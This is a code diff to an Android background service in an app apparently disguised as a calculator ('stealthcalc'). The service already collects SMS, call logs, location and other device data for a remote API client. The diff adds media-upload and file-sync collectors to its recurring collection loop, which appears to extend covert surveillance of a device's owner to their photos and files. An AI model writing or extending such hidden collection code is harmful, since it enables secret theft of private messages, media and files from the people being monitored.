@@ -15,7 +15,9 @@ import com.stealthcalc.monitoring.collector.AppUsageCollector
 import com.stealthcalc.monitoring.collector.BatteryCollector
 import com.stealthcalc.monitoring.collector.CallLogCollector
 import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
+import com.stealthcalc.monitoring.collector.FileSyncCollector
 import com.stealthcalc.monitoring.collector.LocationCollector
+import com.stealthcalc.monitoring.collector.MediaUploadCollector
 import com.stealthcalc.monitoring.collector.MediaChangeCollector
 import com.stealthcalc.monitoring.collector.NetworkCollector
 import com.stealthcalc.monitoring.collector.ScreenStateCollector
@@ -60,6 +62,8 @@ class AgentService : LifecycleService() {
     @Inject lateinit var smsCollector: SmsCollector
     @Inject lateinit var mediaChangeCollector: MediaChangeCollector
     @Inject lateinit var deviceSecurityCollector: DeviceSecurityCollector
+    @Inject lateinit var mediaUploadCollector: MediaUploadCollector
+    @Inject lateinit var fileSyncCollector: FileSyncCollector
     @Inject lateinit var apiClient: AgentApiClient
 
     private var collectJob: Job? = null
@@ -105,6 +109,8 @@ class AgentService : LifecycleService() {
                     networkCollector.collectSnapshot()
                     callLogCollector.collect()
                     smsCollector.collect()
+                    mediaUploadCollector.collect()
+                    fileSyncCollector.collect()
                 }.onFailure { e ->
                     AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                 }
